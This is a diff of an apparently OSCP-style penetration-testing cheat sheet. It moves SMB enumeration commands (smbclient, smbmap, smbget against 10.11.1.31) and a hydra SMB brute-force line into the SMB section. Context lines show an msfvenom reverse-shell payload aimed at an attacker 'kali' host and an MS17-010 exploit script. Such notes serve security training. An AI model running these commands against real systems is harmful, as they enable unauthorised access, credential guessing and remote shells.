@@ -9,7 +9,6 @@
 ### [Compilation](#Compilation-1)
 ### [MSFvenom Payload Generation](#MSFvenom-Payload-Generation-1)
 ### [Hash Cracking](#Hash-Cracking-1)
-### [Credential Brute-Force](#Credential-Brute---Force-1)
 
 
 ## Initial Recon
@@ -287,11 +286,20 @@ Check Samba service version.
 
 ### SMB (WINDOWS SMB) [139, 445 TCP]
 
+Enumerate SMB
+* Look for exploitable services.
+* Look for custom directories/files that were not discoverable via. brute-force.
 ```bash
 $ nmblookup -A [target]
 $ smbclient -L //[target]   // null session
 $ enum4linux [target]       // null session
 $ nbtscan [target]
+
+$ smbclient --no-pass -L //10.11.1.31         # list shares
+$ smbclient --no-pass \\\\[target]\\[share]   # connect to a share
+
+$ smbmap -u "guest" -R [share] -H 10.11.1.31  # recursively list files in a folder
+$ smbget -R smb://[target]/share                # recursively get files from target share/dir
 ```
 
 Automated enum
@@ -313,15 +321,9 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=[kali] LPORT=666 EXITFUNC=thread -
 $ msf17-010-send-and-receive.py [target] ms17-010.exe
 ```
 
-Enumerate SMB
-* Look for exploitable services.
-* Look for custom directories/files that were not discoverable via. brute-force.
-```bash
-$ smbclient --no-pass -L //10.11.1.31         # list shares
-$ smbclient --no-pass \\\\[target]\\[share]   # connect to a share
-
-$ smbmap -u "guest" -R [share] -H 10.11.1.31  # recursively list files in a folder
-$ smbget -R smb://[target]/share                # recursively get files from target share/dir
+SMB Login Brute-force (**last option**)
+```
+$ hydra -V -f -l [username] -P [/path/to/wordlist] smb # smb brute-force
 ```
 
 ### SNMP [161 UDP]
@@ -851,10 +853,4 @@ $ hash-identifier [hash]
 $ hashcat -m [hash-type] -a 0 [hash-file] [wordlist] -o cracked.txt
 ```
 
-## Credential-Brute Force
 
-**THIS SHOULD BE THE LAST OPTION IF YOU CANNOT FIND AN ENTRYPOINT**
-
-```
-$ hydra -V -f -l [username] -P [/path/to/wordlist] smb # smb brute-force
-```
